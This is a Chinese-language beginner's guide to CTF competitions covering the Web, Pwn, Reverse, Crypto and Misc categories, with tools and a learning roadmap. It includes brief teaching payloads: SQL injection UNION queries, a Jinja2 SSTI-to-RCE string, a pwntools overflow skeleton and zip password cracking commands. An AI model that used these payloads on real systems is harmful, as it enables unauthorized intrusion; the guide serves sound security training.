# CTF 新手入门：五大方向介绍与学习路径

---

## 📋 目录

1. [CTF 概述](#一ctf概述)
2. [Web 方向](#二web方向)
3. [Pwn 方向](#三pwn方向)
4. [Reverse 方向](#四reverse方向)
5. [Crypto 方向](#五crypto方向)
6. [Misc 方向](#六misc方向)
7. [学习路线与资源](#七学习路线)

---

## 一、CTF 概述

```
CTF (Capture The Flag) = 夺旗赛

三大赛制:
  Jeopardy (解题模式) — 最常见
    各方向独立解题 → 提交Flag得分
    → 国内CTF主流

  AWD (攻防模式)
    每队维护自己的服务器 → 攻击别人+修补自己
    → 护网风格

  King of the Hill
    抢占并维护"山头" → 持续控制得分

CTF 五大方向:
  Web — Web安全漏洞利用
  Pwn — 二进制漏洞利用(溢出/堆/格式化字符串)
  Reverse — 逆向工程(脱壳/算法/混淆)
  Crypto — 密码学(加解密/数学)
  Misc — 杂项(隐写/取证/流量分析)
```

---

## 二、Web 方向

### 必备技能

```
HTTP协议、Cookie/Session、HTML/JS/PHP基础
SQL注入、XSS、文件上传、文件包含、命令注入
反序列化(PHP/Java)、SSRF、XXE、SSTI
JWT、OAuth、GraphQL 安全
```

### 入门题目

```php
// 经典题: PHP 弱类型比较
if (isset($_GET['a']) && isset($_GET['b'])) {
    if ($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])) {
        echo "flag{xxxx}";
    }
}
// 解法: ?a=240610708&b=QNKCDZO
// md5都是 0e 开头 → PHP松散比较 → 0==0 → true
```

```sql
# SQL注入 — UNION查询
# ?id=1 → 正常
# ?id=1' → 报错 → 注入点
# ?id=-1 UNION SELECT 1,database(),3 -- - → 爆数据库
# ?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -
```

```python
# SSTI (模板注入)
# Flask/Jinja2: {{config}}  → 泄露配置
# {{''.__class__.__mro__[1].__subclasses__()}} → RCE
```

**推荐靶场**: BUUCTF, CTFHub, XCTF攻防世界, PortSwigger Web Academy

---

## 三、Pwn 方向

### 必备技能

```
C语言、汇编(x86/x64)、Linux基础
栈溢出(Stack Overflow)、Canary绕过
ROP (Return-Oriented Programming)
格式化字符串漏洞
Heap 利用(Use-After-Free, Fastbin, Tcache)
```

### pwntools 基础

```python
from pwn import *

# 连接远程
# r = remote('ctf.example.com', 10001)
# 本地调试
r = process('./pwn')

# 接收数据
r.recvuntil(b'Input: ')

# 构造Payload
payload = b'A' * 40          # 填充
payload += p64(0x401234)     # 返回地址(ROP gadget)

# 发送
r.sendline(payload)

# 交互模式
r.interactive()
```

### 入门练习

```
checksec 检查保护:
  Arch: amd64
  RELRO: Partial RELRO
  Stack: No canary found    ← 无Canary → 可栈溢出
  NX: NX enabled
  PIE: No PIE               ← 地址固定 → 容易利用

经典入门:
  pwnable.kr → fd, collision, bof
  pwnable.tw → start, orw
  pwn.college → 系统课程(ASU大学)
```

---

## 四、Reverse 方向

### 必备技能

```
汇编(x86/x64)、C/C++阅读能力
IDA Pro / Ghidra 静态分析
x64dbg / GDB 动态调试
加密算法识别(AES/RC4/XOR/Base64)
反混淆/脱壳
```

### 工具链

```bash
# 静态分析
IDA Pro / Ghidra  → 反编译+伪代码

# 动态调试
x64dbg (Windows)  → 动态追踪
GDB + pwndbg/gef  → Linux调试

# 文件分析
file crackme.exe          # 文件类型
strings crackme.exe       # 搜索字符串
binwalk crackme.exe       # 固件分析
detect-it-easy            # 查壳
```

**入门**: crackmes.one, reversing.kr

---

## 五、Crypto 方向

```python
# 经典RSA
from Crypto.Util.number import *

p = getPrime(512)
q = getPrime(512)
n = p * q
e = 65537
c = pow(flag, e, n)

# 攻击: 如果n可分解:
# factordb.com → 分解n → 得到p,q → 解密

# 低加密指数攻击(e=3):
# c = m^3 mod n, 如果m^3 < n → c = m^3
# → m = c^(1/3) (整数开方)

# 共模攻击(同一m, 不同e):
# c1 = m^e1 mod n, c2 = m^e2 mod n
# if gcd(e1,e2)==1 → 可恢复m
```

**入门**: CryptoHack, cryptopals.com

---

## 六、Misc 方向

```
图片隐写:
  steghide extract -sf image.jpg         # 提取隐藏数据
  zsteg image.png                         # LSB隐写
  binwalk -e image.jpg                    # 文件拼接

流量分析:
  Wireshark → Follow TCP Stream
  tshark -r capture.pcap -Y "http"        # 过滤HTTP
  binwalk -e capture.pcap                 # 提取传输文件

压缩包:
  fcrackzip -b -u -c a -l 1-6 flag.zip   # 爆破密码
  zip2john → hashcat                      # 密码爆破

取证:
  volatility -f memory.dump imageinfo     # 内存分析
  foremost -i disk.img -o output/         # 文件恢复
```

---

## 七、学习路线

```
Phase 1 (1-2月): 基础 + 各方向入门
  → Linux命令、Python脚本、网络基础
  → 每个方向做20道入门题
  → 确定1-2个主方向

Phase 2 (3-6月): 主方向深入
  → 主方向刷100+题
  → 参加线上赛(CTFtime)
  → 赛后复现+写WP

Phase 3 (6-12月): 战队+进阶
  → 加入战队、稳定参赛
  → 学习高级技术
  → 出题/分享

推荐平台:
  CTFtime.org → 全球CTF日历
  CTFHub / BUUCTF / NSSCTF → 国内练习
  XCTF联赛 / 强网杯 → 国内大赛
```

---

## ✅ Checklist

- [ ] Linux/Python/Git 基础
- [ ] 各方向入门题各20道
- [ ] pwntools/IDA/Ghidra 熟练
- [ ] CTFtime 注册
- [ ] 参加1场线上赛
- [ ] 复现赛后WP
